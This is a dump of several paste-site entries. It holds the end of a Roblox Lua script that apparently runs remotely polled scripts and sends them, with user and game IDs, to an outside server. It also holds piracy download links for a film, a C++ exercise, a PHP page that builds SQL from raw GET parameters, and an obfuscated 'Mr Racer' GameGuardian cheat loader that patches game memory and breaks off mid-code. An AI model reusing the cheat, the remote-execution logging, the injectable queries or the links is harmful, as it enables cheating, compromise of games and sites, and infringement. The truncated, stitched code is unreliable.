								print(""hub/custom stub ("" .. tostring(polled_script) .. "")"")
							else
								print(""custom stub ("" .. tostring(polled_script) .. "")"")
							end
							if SCRIPT_LOGGING then
								pcall(function()
									HttpService:PostAsync(""https://api.serverside.fun/v1/script-logs"", HttpService:JSONEncode({
										[""script""] = polled_script,
										[""robloxId""] = tostring(WHITELIST_USER_ID),
										[""gameId""] = tostring(WHITELIST_GAME_ID)
									}))
								end)
							end
						end
					end
				end
			end
		end
		task.wait()
	end
end
"
b2NAnJ1Y,Hui.Buh.und.das.Hexenschloss.2022.Dual.Deu.Spa.720.h264.ac3.Subs-bp,bpmircea,BrainFuck,Sunday 7th of January 2024 02:57:20 PM CDT,"Hui Buh und das Hexenschloss (Hui Buh and the Witchs Castle) (Sebastian Niemann, 2022)
aka
Hui.Buh.und.das.Hexenschloss.2022.Dual.Deu.Spa.720.h264.ac3.Subs-bp
https://www.imdb.com/title/tt14176696/

http://up-4.net/d/sUr2
https://filecrypt.cc/Container/D03621D225.html
https://t.me/DeuFree/1468

Audio tracks: de | Subtitles: de en es ru"
V2XZJYYs,–õ–†6,Maestro1,C++,Sunday 7th of January 2024 02:53:26 PM CDT,"#include <iostream>
#include <string>

using namespace std;

int main() {
    string str;

    cout << ""–í–≤–µ–¥–∏—Ç–µ —Å—Ç—Ä–æ–∫—É: "";
    getline(cin, str);

    size_t lastPos = str.rfind(""programma"");

    size_t pos = 0;
    while ((pos = str.find(""programma"", pos)) != string::npos) {
        str.erase(pos, 9); 
    }


    cout << ""–°—Ç—Ä–æ–∫–∞ –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –≤—Å–µ—Ö –≤—Ö–æ–∂–¥–µ–Ω–∏–π —Å–ª–æ–≤–∞ 'programma': "" << str << endl;

    if (lastPos != string::npos) {
        cout << ""–ü–æ–∑–∏—Ü–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –≤—Ö–æ–∂–¥–µ–Ω–∏—è —Å–ª–æ–≤–∞ 'programma': "" << lastPos << endl;
    } else {
        cout << ""–°–ª–æ–≤–æ 'programma' –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤ —Å—Ç—Ä–æ–∫–µ."" << endl;
    }

    return 0;
}"
csYaLCYH,index2,ppiso,PHP,Sunday 7th of January 2024 02:28:23 PM CDT,"<!DOCTYPE html>
<html lang=""pl"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Kartkowka</title>

    <style>
        .kategoria, .kategoria > tr, .kategoria td
        {
            border: 1px solid black;
            padding: 10px 50px;
            border-collapse:collapse;
        }
    </style>
</head>
<body>
    <?php
        error_reporting(0);
        mysqli_report(MYSQLI_REPORT_OFF);

        $connect =@new mysqli('localhost', 'root', '', 'kart1');
        if($connect->connect_error)
        {
            echo ""Wystapil problem z polaczeniem z baza!"";
            exit;
        }

        if(ISSET($_GET['mode']))
        {
            if($_GET['mode']==""dodaj"")
            {
                $query = ""INSERT INTO zwierze (typ,wiek,imie,kolor) VALUES ('{$_GET['typ']}','{$_GET['wiek']}','{$_GET['imie']}','{$_GET['kolor']}')"";
                $connect->query($query);
            }
        }
    ?>
    <form action=""index.php"" method=""get"">
        <table>
            <tr>
                <td>typ</td>
                <td><input type=""text"" name=""typ"" placeholder=""pies""></td>
            </tr>
            <tr>
                <td>wiek</td>
                <td><input type=""number"" min=""1"" name=""wiek"" placeholder=""1""></td>
            </tr>
            <tr>
                <td>imie</td>
                <td><input type=""text"" name=""imie"" placeholder=""reksio""></td>
            </tr>
            <tr>
                <td>kolor</td>
                <td><input type=""text"" name=""kolor"" placeholder=""czarny""></td>
            </tr>
        </table>
        <input type=""submit"" name=""mode"" value=""dodaj"">
    </form>

    <br><br>

    <form action=""index.php"" method=""get"">
        Wybierz: 
        <select name=""kategoria"">
            <?php
                $query=""SELECT typ FROM `zwierze`"";
                $result=$connect->query($query);

                while($row=$result->fetch_object())
                {
                    echo ""<option value=$row->typ>$row->typ</option>"";
                }
                $result->free_result;
            ?>
        </select>
        <input type=""submit"" name=""mode"" value=""wyswietl"">
    </form>

    <br>

    <?php
        if(ISSET($_GET['mode']))
        {
            if($_GET['mode']==""wyswietl"")
            {
                echo<<<table
                    <table class=""kategoria"">
                        <tr>
                            <td>id</td>
                            <td>typ</td>
                            <td>wiek</td>
                            <td>imie</td>
                            <td>kolor</td>
                        </tr>
                table;

                $query=""SELECT * FROM `zwierze` WHERE typ='{$_GET['kategoria']}'"";           
                $result=$connect->query($query);

                while($row=$result->fetch_object())
                {
                    echo<<<table2
                        <tr>
                            <td>$row->zwierze_id</td>
                            <td>$row->typ</td>
                            <td>$row->wiek</td>
                            <td>$row->imie</td>
                            <td>$row->kolor</td>
                        </tr>
                        </table>
                    table2;
                }
                echo ""</table>"";
                $result->free_result();
            }
        }
    ?>

    <?php $connect->close(); ?>
</body>
</html>"
jTWTQXd1,Mr Racer,handsome07,Lua,Sunday 7th of January 2024 02:18:41 PM CDT,"--[[
 
          \_Welcome to VVRTRICKS 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "".."", function(v30)
		if (v1(v30, 2) == 79) then
			local v83 = 0;
			while true do
				if (v83 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return """";
				end
			end
		else
			local v84 = 0;
			local v85;
			while true do
				if (v84 == 0) then
					v85 = v2(v0(v30, 16));
					if v19 then
						local v102 = v5(v85, v19);
						v19 = nil;
						return v102;
					else
						return v85;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v86 = (v31 / ((879 - (282 + 595)) ^ (v32 - (2 - 1)))) % (2 ^ (((v33 - ((1639 - (1523 + 114)) - 1)) - (v32 - (1 - 0))) + (2 - 1)));
			return v86 - (v86 % ((98 + 522) - (499 + 56 + 64)));
		else
			local v87 = (933 - (857 + 74)) ^ (v32 - (569 - (367 + 201)));
			return (((v31 % (v87 + v87)) >= v87) and (928 - (214 + 713))) or (0 + (0 - 0));
		end
	end
	local function v21()
		local v34 = 1065 - (68 + 997);
		local v35;
		while true do
			if (v34 == 1) then
				return v35;
			end
			if (v34 == ((1245 + 25) - (226 + 1044))) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (4 - 3);
				v34 = 118 - (8 + 24 + 85);
			end
		end
	end
	local function v22()
		local v36 = (702 + 255) - (892 + 65);
		local v37;
		local v38;
		while true do
			if (v36 == (0 - 0)) then
				v37, v38 = v1(v16, v18, v18 + (3 - 1));
				v18 = v18 + 2;
				v36 = 1;
			end
			if (v36 == (181 - (67 + 113))) then
				return (v38 * (469 - (522 - 309))) + v37;
			end
		end
	end
	local function v23()
		local v39, v40, v41, v42 = v1(v16, v18, v18 + 3 + 0);
		v18 = v18 + 4;
		return (v42 * (66680831 - (90523321 - 40619706))) + (v41 * (66488 - (802 + 150))) + (v40 * (689 - (316 + 117))) + v39;
	end
	local function v24()
		local v43 = 997 - (915 + 82);
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		local v49;
		while true do
			if (v43 == ((5 + 3) - 5)) then
				if (v48 == ((0 - 0) + 0)) then
					if (v47 == (0 - 0)) then
						return v49 * (1187 - (1069 + 118));
					else
						v48 = 2 - (3 - 2);
						v46 = (859 - (814 + 45)) - 0;
					end
				elseif (v48 == (356 + 1691)) then
					return ((v47 == 0) and (v49 * (1 / (0 - (0 - 0))))) or (v49 * NaN);
				end
				return v8(v49, v48 - (1015 + 8)) * (v46 + (v47 / ((793 - (368 + 23 + 400)) ^ (19 + 33))));
			end
			if (v43 == (3 - 2)) then
				v46 = 19 - (10 + 8);
				v47 = (v20(v45, 3 - 2, 462 - (416 + 26)) * ((6 - 4) ^ (14 + 18))) + v44;
				v43 = 2;
			end
			if (v43 == ((888 - (261 + 624)) - 1)) then
				v48 = v20(v45, 459 - (145 + (520 - 227)), 31);
				v49 = ((v20(v45, 462 - (44 + 386)) == (1487 - (998 + 488))) and -(1 + 0)) or (1 + 0);
				v43 = 775 - (201 + 571);
			end
			if (v43 == (1138 - (116 + 1022))) then
				v44 = v23();
				v45 = v23();
				v43 = 4 - 3;
			end
		end
	end
	local function v25(v50)
		local v51 = 766 - (745 + (57 - 36));
		local v52;
		local v53;
		while true do
			if (v51 == (1083 - ((2837 - (1703 + 114)) + (761 - (376 + 325))))) then
				return v6(v53);
			end
			if ((1424 - ((1032 - 402) + 793)) == v51) then
				v52 = v3(v16, v18, (v18 + v50) - (3 - 2));
				v18 = v18 + v50;
				v51 = (18 - 12) - 4;
			end
			if (v51 == ((0 + 0) - 0)) then
				v52 = nil;
				if not v50 then
					local v96 = 0 + 0;
					while true do
						if (0 == v96) then
							v50 = v23();
							if (v50 == (0 - 0)) then
								return """";
							end
							break;
						end
					end
				end
				v51 = 1748 - (760 + 987);
			end
			if (v51 == (2 + 0)) then
				v53 = {};
				for v90 = 2 - (2 - 1), #v52 do
					v53[v90] = v2(v1(v3(v52, v90, v90)));
				end
				v51 = 1916 - (1789 + 124);
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12(""#"", ...);
	end
	local function v28()
		local v54 = 1246 - (383 + 863);
		local v55;
		local v56;
		local v57;
		local v58;
		local v59;
		local v60;
		local v61;
		local v62;
		while true do
			if (v54 ~= (323 - (196 + 126))) then
			else
				v57 = nil;
				v58 = nil;
				v54 = 2 - 0;
			end
			if (v54 == 4) then
				while true do
					if (v55 == 1) then
						local v99 = 982 - (18 + 964);
						while true do
							if (v99 == (0 - 0)) then
								v58 = nil;
								v59 = nil;
								v99 = 1;
							end
							if (v99 == (1 + 0)) then
								v55 = 2 + 0;
								break;
							end
						end
					end
					if (v55 == 0) then
						local v100 = 850 - (20 + 830);
						while true do
							if ((0 + 0) == v100) then
								v56 = 126 - (116 + 10);
								v57 = nil;
								v100 = 1;
							end
							if (v100 == 1) then
								v55 = 1 + 0;
								break;
							end
						end
					end
					if (v55 ~= 3) then
					else
						v62 = nil;
						while true do
							local v103 = 0;
							local v104;
							local v105;
							while true do
								if (0 ~= v103) then
								else
									v104 = 738 - (542 + 196);
									v105 = nil;
									v103 = 1;
								end
								if (v103 == 1) then
									while true do
										if (v104 ~= 0) then
										else
											v105 = 0 - 0;
											while true do
												if (v105 == (1 + 0)) then
													if (v56 ~= 0) then
													else
														local v157 = 0 + 0;
														local v158;
														while true do
															if (v157 == (0 + 0)) then
																v158 = 0 - 0;
																while true do
																	if (v158 == 1) then
																		v59 = {};
																		v56 = 2 - 1;
																		break;
																	end
																	if (v158 ~= (1551 - (1126 + 425))) then
																	else
																		local v179 = 0;
																		while true do
																			if (v179 == (405 - (118 + 287))) then
																				v57 = {};
																				v58 = {};
																				v179 = 1;
																			end
																			if (v179 == 1) then
																				v158 = 1;
																				break;
																			end
																		end
																	end
																end
																break;
															end
														end
													end
													if (v56 == 3) then
														local v159 = 0 - 0;
														while true do
															if (v159 == (1121 - (118 + 1003))) then
																for v177 = 1, v23() do
																	v58[v177 - 1] = v28();
																end
																return v60;
															end
														end
													end
													break;
												end
												if (v105 == 0) then
													local v140 = 0;
													while true do
														if (v140 == 1) then
															v105 = 2 - 1;
															break;
														end
														if (v140 ~= (377 - (142 + 235))) then
														else
															if (v56 == (9 - 7)) then
																local v172 = 0 + 0;
																local v173;
																local v174;
																while true do
																	if (v172 == 1) then
																		while true do
																			if (v173 == 0) then
																				v174 = 977 - (553 + 424);
																				while true do
																					if (v174 ~= 0) then
																					else
																						local v182 = 0 - 0;
																						local v183;
																						while true do
																							if (v182 ~= (0 + 0)) then
																							else
																								v183 = 0 + 0;
																								while true do
																									if (v183 ~= (1 + 0)) then
																									else
																										v174 = 1;
																										break;
																									end
																									if (v183 == 0) then
																										local v189 = 0 + 0;
																										while true do
																											if (v189 == (0 + 0)) then
																												for v193 = 2 - 1, v61 do
																													local v194 = 0 - 0;
																													local v195;
																													local v196;
																													local v197;
																													local v198;
																													while true do
																														if (v194 == (2 - 1)) then
																															v197 = nil;
																															v198 = nil;
																															v194 = 1 + 1;
																														end
																														if (v194 == (0 - 0)) then
																															v195 = 0;
																															v196 = nil;
																															v194 = 754 - (239 + 514);
																														end
																														if (v194 == 2) then
																															while true do
																																if (v195 == 1) then
																																	v198 = nil;
																																	while true do
																																		if (v196 ~= (0 + 0)) then
																																		else
																																			v197 = v21();
																																			v198 = nil;
																																			v196 = 1330 - (797 + 532);
																																		end
																																		if (v196 == 1) then
																																			if (v197 == 1) then
																																				v198 = v21() ~= (0 + 0);
																																			elseif (v197 == 2) then
																																				v198 = v24();
																																			elseif (v197 == 3) then
																																				v198 = v25();
																																			end
																																			v62[v193] = v198;
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if (v195 == (0 + 0)) then
																																	local v206 = 0;
																																	while true do
																																		if (1 ~= v206) then
																																		else
																																			v195 = 1;
																																			break;
																																		end
																																		if (v206 == (0 - 0)) then
																																			v196 = 1202 - (373 + 829);
																																			v197 = nil;
																																			v206 = 732 - (476 + 255);
																																		end
																																	end
																																end
																															end
																															break;
																														end
																													end
																												end
																												v60[3] = v21();
																												v189 = 1131 - (369 + 761);
																											end
																											if (v189 == 1) then
																												v183 = 1;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																						end
																					end
																					if (v174 ~= (1 + 0)) then
																					else
																						for v184 = 1 - 0, v23() do
																							local v185 = 0;
																							local v186;
																							local v187;
																							local v188;
																							while true do
																								if (v185 == 1) then
																									v188 = nil;
																									while true do
																										if (v186 == 1) then
																											while true do
																												if (v187 ~= (0 - 0)) then
																												else
																													v188 = v21();
																													if (v20(v188, 1, 1) == (238 - (64 + 174))) then
																														local v199 = 0 + 0;
																														local v200;
																														local v201;
																														local v202;
																														local v203;
																														local v204;
																														while true do
																															if (v199 == (0 - 0)) then
																																v200 = 336 - (144 + 192);
																																v201 = nil;
																																v199 = 217 - (42 + 174);
																															end
																															if (v199 ~= 1) then
																															else
																																v202 = nil;
																																v203 = nil;
																																v199 = 2;
																															end
																															if (v199 == (2 + 0)) then
																																v204 = nil;
																																while true do
																																	if (1 ~= v200) then
																																	else
																																		v203 = nil;
																																		v204 = nil;
																																		v200 = 2 + 0;
																																	end
																																	if (v200 ~= (1 + 1)) then
																																	else
																																		while true do
																																			if (v201 ~= (1504 - (363 + 1141))) then
																																			else
																																				local v208 = 0;
																																				local v209;
																																				local v210;
																																				while true do
																																					if (v208 == (1581 - (1183 + 397))) then
																																						while true do
																																							if (v209 == (0 - 0)) then
																																								v210 = 0 + 0;
																																								while true do
																																									if (v210 ~= (1 + 0)) then
																																									else
																																										v201 = 1976 - (1913 + 62);
																																										break;
																																									end
																																									if (0 ~= v210) then
																																									else
																																										v202 = v20(v188, 2, 3);
																																										v203 = v20(v188, 4, 4 + 2);
																																										v210 = 1;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																					if (v208 ~= (0 - 0)) then
																																					else
																																						v209 = 0;
																																						v210 = nil;
																																						v208 = 1;
																																					end
																																				end
																																			end
																																			if (v201 == 3) then
																																				if (v20(v203, 1936 - (565 + 1368), 3) == 1) then
																																					v204[4] = v62[v204[15 - 11]];
																																				end
																																				v57[v184] = v204;
																																				break;
																																			end
																																			if (v201 ~= (1663 - (1477 + 184))) then
																																			else
																																				local v212 = 0 - 0;
																																				while true do
																																					if (v212 == (1 + 0)) then
																																						v201 = 3;
																																						break;
																																					end
																																					if (v212 == (856 - (564 + 292))) then
																																						local v218 = 0;
																																						local v219;
																																						while true do
																																							if (v218 == 0) then
																																								v219 = 0 - 0;
																																								while true do
																																									if (1 ~= v219) then
																																									else
																																										v212 = 2 - 1;
																																										break;
																																									end
																																									if (v219 == 0) then
																																										if (v20(v203, 305 - (244 + 60), 1) ~= 1) then
																																										else
																																											v204[2 + 0] = v62[v204[478 - (41 + 435)]];
																																										end
																																										if (v20(v203, 1003 - (938 + 63), 2) == (1 + 0)) then
																																											v204[1128 - (936 + 189)] = v62[v204[3]];
																																										end
																																										v219 = 1;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				end
																																			end
																																			if (v201 ~= (1 + 0)) then
																																			else
																																				local v213 = 0;
																																				local v214;
																																				local v215;
																																				while true do
																																					if (v213 == 0) then
																																						v214 = 0;
																																						v215 = nil;
																																						v213 = 1;
																																					end
																																					if (v213 ~= 1) then
																																					else
																																						while true do
																																							if (v214 == (1613 - (1565 + 48))) then
																																								v215 = 0;
																																								while true do
																																									if (1 == v215) then
																																										v201 = 2 + 0;
																																										break;
																																									end
																																									if (0 == v215) then
																																										local v220 = 1138 - (782 + 356);
																																										local v221;
																																										while true do
																																											if (0 == v220) then
																																												v221 = 267 - (176 + 91);
																																												while true do
																																													if (v221 ~= 1) then
																																													else
																																														v215 = 2 - 1;
																																														break;
																																													end
																																													if (v221 == (0 - 0)) then
																																														v204 = {v22(),v22(),nil,nil};
																																														if (v202 == (1875 - (157 + 1718))) then
																																															local v226 = 0;
																																															local v227;
																																															while true do
																																																if (v226 ~= (0 + 0)) then
																																																else
																																																	v227 = 0 - 0;
																																																	while true do
																																																		if (v227 == (0 - 0)) then
																																																			v204[1021 - (697 + 321)] = v22();
																																																			v204[4] = v22();
																																																			break;
																																																		end
																																																	end
																																																	break;
																																																end
																																															end
																																														elseif (v202 == (2 - 1)) then
																																															v204[5 - 2] = v23();
																																														elseif (v202 == (4 - 2)) then
																																															v204[3] = v23() - ((1 + 1) ^ 16);
																																														elseif (v202 == 3) then
																																															local v232 = 0 - 0;
																																															local v233;
																																															local v234;
																																															local v235;
																																															while true do
																																																if (1 ~= v232) then
																																																else
																																																	v235 = nil;
																																																	while true do
																																																		if (v233 == (0 - 0)) then
																																																			local v236 = 1227 - (322 + 905);
																																																			while true do
																																																				if (v236 == (612 - (602 + 9))) then
																																																					v233 = 1;
																																																					break;
																																																				end
																																																				if (v236 ~= (1189 - (449 + 740))) then
																																																				else
																																																					v234 = 872 - (826 + 46);
																																																					v235 = nil;
																																																					v236 = 948 - (245 + 702);
																																																				end
																																																			end
																																																		end
																																																		if (1 == v233) then
																																																			while true do
																																																				if (v234 ~= 0) then
																																																				else
																																																					v235 = 0 - 0;
																																																					while true do
																																																						if (v235 == 0) then
																																																							v204[1 + 2] = v23() - ((1900 - (260 + 1638)) ^ 16);
																																																							v204[4] = v22();
																																																							break;
																																																						end
																																																					end
																																																					break;
																																																				end
																																																			end
																																																			break;
																																																		end
																																																	end
																																																	break;
																																																end
																																																if (v232 == (440 - (382 + 58))) then
																																																	v233 = 0 - 0;
																																																	v234 = nil;
																																																	v232 = 1;
																																																end
																																															end
																																														end
																																														v221 = 1 + 0;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v200 == 0) then
																																		v201 = 0;
																																		v202 = nil;
																																		v200 = 1 - 0;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													break;
																												end
																											end
																											break;
																										end
																										if (v186 == (0 - 0)) then
																											local v190 = 0;
																											local v191;
																											while true do
																												if (v190 == 0) then
																													v191 = 0;
																													while true do
																														if (v191 == 1) then
																															v186 = 1206 - (902 + 303);
																															break;
																														end
																														if (v191 ~= 0) then
																														else
																															local v205 = 0;
																															while true do
																																if (1 == v205) then
																																	v191 = 1 - 0;
																																	break;
																																end
																																if (v205 == (0 - 0)) then
																																	v187 = 0;
																																	v188 = nil;
																																	v205 = 1;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																									end
																									break;
																								end
																								if (v185 == (0 + 0)) then
																									v186 = 0;
																									v187 = nil;
																									v185 = 1;
																								end
																							end
																						end
																						v56 = 3;
																						break;
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																	if (v172 ~= (1690 - (1121 + 569))) then
																	else
																		v173 = 0;
																		v174 = nil;
																		v172 = 215 - (22 + 192);
																	end
																end
															end
															if (v56 == 1) then
																local v175 = 0;
																local v176;
																while true do
																	if (0 ~= v175) then
																	else
																		v176 = 0;
																		while true do
																			if ((683 - (483 + 200)) ~= v176) then
																			else
																				local v180 = 1463 - (1404 + 59);
																				local v181;
																				while true do
																					if (v180 == (0 - 0)) then
																						v181 = 0 - 0;
																						while true do
																							if (v181 == (766 - (468 + 297))) then
																								v176 = 563 - (334 + 228);
																								break;
																							end
																							if (v181 == (0 - 0)) then
																								v60 = {v57,v58,nil,v59};
																								v61 = v23();
																								v181 = 1 + 0;
																							end
																						end
																						break;
																					end
																				end
																			end
																			if (v176 == (237 - (141 + 95))) then
																				v62 = {};
																				v56 = 2;
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v140 = 1;
														end
													end
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
					if (2 ~= v55) then
					else
						local v101 = 0 + 0;
						while true do
							if (v101 == 1) then
								v55 = 3;
								break;
							end
							if (v101 == (0 - 0)) then
								v60 = nil;
								v61 = nil;
								v101 = 1;
							end
						end
					end
				end
				break;
			end
			if (v54 == (0 - 0)) then
				v55 = 0;
				v56 = nil;
				v54 = 1;
			end
			if (3 ~= v54) then
			else
				v61 = nil;
				v62 = nil;
				v54 = 4;
			end
			if (v54 == (1 + 1)) then
				v59 = nil;
				v60 = nil;
				v54 = 8 - 5;
			end
		end
	end
	local function v29(v63, v64, v65)
		local v66 = v63[1];
		local v67 = v63[2];
		local v68 = v63[3];
		return function(...)
			local v69 = v66;
			local v70 = v67;
			local v71 = v68;
			local v72 = v27;
			local v73 = 1;
			local v74 = -1;
			local v75 = {};
			local v76 = {...};
			local v77 = v12(""#"", ...) - 1;
			local v78 = {};
			local v79 = {};
			for v88 = 0, v77 do
				if (v88 >= v71) then
					v75[v88 - v71] = v76[v88 + 1];
				else
					v79[v88] = v76[v88 + 1];
				end
			end
			local v80 = (v77 - v71) + 1;
			local v81;
			local v82;
			while true do
				local v89 = 0;
				while true do
					if (v89 == 0) then
						v81 = v69[v73];
						v82 = v81[1];
						v89 = 1;
					end
					if (v89 == 1) then
						if (v82 <= 15) then
							if (v82 <= 7) then
								if (v82 <= 3) then
									if (v82 <= 1) then
										if (v82 > 0) then
											if (v79[v81[2]] == v79[v81[4]]) then
												v73 = v73 + 1;
											else
												v73 = v81[3];
											end
										elseif ((v81[3] == ""_ENV"") or (v81[3] == ""getfenv"")) then
											v79[v81[2]] = v65;
										else
											v79[v81[2]] = v65[v81[3]];
										end
									elseif (v82 == 2) then
										if (v79[v81[2]] == v79[v81[4]]) then
											v73 = v73 + 1;
										else
											v73 = v81[3];
										end
									else
										local v106 = v81[2];
										v79[v106] = v79[v106](v13(v79, v106 + 1, v81[3]));
									end
								elseif (v82 <= 5) then
									if (v82 == 4) then
										local v108 = v81[2];
										v79[v108] = v79[v108]();
									else
										local v110 = v81[2];
										v79[v110] = v79[v110](v79[v110 + 1]);
									end
								elseif (v82 > 6) then
									if (v81[2] < v79[v81[4]]) then
										v73 = v73 + 1;
									else
										v73 = v81[3];
									end
								else
									for v141 = v81[2], v81[3] do
										v79[v141] = nil;
									end
								end
							elseif (v82 <= 11) then
								if (v82 <= 9) then
									if (v82 == 8) then
										local v112 = 0;
										local v113;
										local v114;
										while true do
											if (v112 == 0) then
												v113 = v81[2];
												v114 = v79[v81[3]];
												v112 = 1;
											end
											if (v112 == 1) then
												v79[v113 + 1] = v114;
												v79[v113] = v114[v81[4]];
												break;
											end
										end
									else
										v79[v81[2]]();
									end
								elseif (v82 > 10) then
									do
										return;
									end
								elseif ((v81[3] == ""_ENV"") or (v81[3] == ""getfenv"")) then
									v79[v81[2]] = v65;
								else
									v79[v81[2]] = v65[v81[3]];
								end
							elseif (v82 <= 13) then
								if (v82 == 12) then
									v79[v81[2]] = v79[v81[3]][v81[4]];
								else
									v79[v81[2]]();
								end
							elseif (v82 == 14) then
								if (v81[2] < v79[v81[4]]) then
									v73 = v73 + 1;
								else
									v73 = v81[3];
								end
							else
								v73 = v81[3];
							end
						elseif (v82 <= 23) then
							if (v82 <= 19) then
								if (v82 <= 17) then
									if (v82 == 16) then
										for v143 = v81[2], v81[3] do
											v79[v143] = nil;
										end
									else
										v79[v81[2]] = v81[3];
									end
								elseif (v82 == 18) then
									v65[v81[3]] = v79[v81[2]];
								else
									v73 = v81[3];
								end
							elseif (v82 <= 21) then
								if (v82 == 20) then
									v79[v81[2]] = v81[3];
								else
									v79[v81[2]] = v79[v81[3]][v81[4]];
								end
							elseif (v82 == 22) then
								local v127 = v81[2];
								v79[v127](v79[v127 + 1]);
							else
								local v128 = v81[2];
								v79[v128] = v79[v128](v79[v128 + 1]);
							end
						elseif (v82 <= 27) then
							if (v82 <= 25) then
								if (v82 > 24) then
									if (v79[v81[2]] == v81[4]) then
										v73 = v73 + 1;
									else
										v73 = v81[3];
									end
								else
									local v130 = v81[2];
									v79[v130](v79[v130 + 1]);
								end
							elseif (v82 == 26) then
								v65[v81[3]] = v79[v81[2]];
							else
								local v133 = v81[2];
								v79[v133] = v79[v133]();
							end
						elseif (v82 <= 29) then
							if (v82 == 28) then
								do
									return;
								end
							elseif (v79[v81[2]] == v81[4]) then
								v73 = v73 + 1;
							else
								v73 = v81[3];
							end
						elseif (v82 == 30) then
							local v135 = 0;
							local v136;
							local v137;
							while true do
								if (v135 == 0) then
									v136 = v81[2];
									v137 = v79[v81[3]];
									v135 = 1;
								end
								if (v135 == 1) then
									v79[v136 + 1] = v137;
									v79[v136] = v137[v81[4]];
									break;
								end
							end
						else
							local v138 = 0;
							local v139;
							while true do
								if (v138 == 0) then
									v139 = v81[2];
									v79[v139] = v79[v139](v13(v79, v139 + 1, v81[3]));
									break;
								end
							end
						end
						v73 = v73 + 1;
						break;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
vv9(), ...);

gg.setVisible(false)
gg.clearList()
gg.clearResults()
gg.setRanges(32)
gg.searchNumber(4611686019520004096, gg.TYPE_QWORD)
HackersHouse = gg.getResults(250000)
Offsets = {}
Offsets['FirstOffset'] = {}
Offsets['SecondOffset'] = {}
Offsets['FinalResults'] = {}
OffsetsIndex = 1
for index, value in ipairs(HackersHouse) do
	Offsets['FirstOffset'][OffsetsIndex] = {}
	Offsets['FirstOffset'][OffsetsIndex].address = HackersHouse[index].address + 96
	Offsets['FirstOffset'][OffsetsIndex].flags = gg.TYPE_QWORD
	Offsets['SecondOffset'][OffsetsIndex] = {}
	Offsets['SecondOffset'][OffsetsIndex].address = HackersHouse[index].address + -224
	Offsets['SecondOffset'][OffsetsIndex].flags = gg.TYPE_QWORD	OffsetsIndex = OffsetsIndex + 1
end
Offsets['FirstOffset'] = gg.getValues(Offsets['FirstOffset'])
Offsets['SecondOffset'] = gg.getValues(Offsets['SecondOffset'])
OffsetsIndex = 1
for index, value in ipairs(Offsets['FirstOffset']) do
	if (Offsets['FirstOffset'][index].value == 4525216907551571968) and (Offsets['SecondOffset'][index].value == -4548635622628226446) then
		Offsets['FinalResults'][OffsetsIndex] = {}
		Offsets['FinalResults'][OffsetsIndex] =  Offsets['FirstOffset'][index]
		OffsetsIndex = OffsetsIndex + 1
	end
end
for index, value in ipairs(Offsets['FinalResults']) do
	Offsets['FinalResults'][index].address = Offsets['FinalResults'][index].address + -268
	Offsets['FinalResults'][index].flags = 4
end
gg.loadResults(Offsets['FinalResults'])
--[[

          \_Welcome to VVRTRICKS 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 0;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24;
	local v25;
	local v26;
	local v27;
	local v28;
	local v29;
	local v30;
	while true do
		if (v18 == 5) then
			v27 = v24;
			v28 = nil;
			function v28(...)
				return {...}, v12(""#"", ...);
			end
			v18 = 6;
		end
		if (v18 == 1) then
			v21 = nil;
			function v21(v31, v32, v33)
				if v33 then
					local v72 = 0 - 0;
					local v73;
					while true do
						if (v72 == (0 - 0)) then
							v73 = (v31 / ((3 - 1) ^ (v32 - 1))) % (2 ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + (932 - ((1221 - 364) + 74))));
							return v73 - (v73 % (569 - ((1432 - (68 + 997)) + 201)));
						end
					end
				else
					local v74 = 927 - ((1484 - (226 + 1044)) + 713);
					local v75;
					while true do
						if (v74 == (0 + 0)) then
							v75 = ((4 - 3) + 1) ^ (v32 - (878 - (282 + 595)));
							return (((v31 % (v75 + v75)) >= v75) and (1638 - (1523 + 114))) or (0 + 0);
						end
					end
				end
			end
			v22 = nil;
			v18 = 2;
		end
		if (v18 == 3) then
			v24 = nil;
			function v24()
				local v34 = 0 - 0;
				local v35;
				local v36;
				local v37;
				local v38;
				while true do
					if (v34 == (118 - (32 + 85))) then
						return (v38 * (16777566 - (87 + 263))) + (v37 * (65716 - (67 + (449 - 336)))) + (v36 * (251 + 5)) + v35;
					end
					if ((0 + (952 - (802 + 150))) == v34) then
						v35, v36, v37, v38 = v1(v16, v19, v19 + 1 + 2);
						v19 = v19 + (961 - (892 + 65));
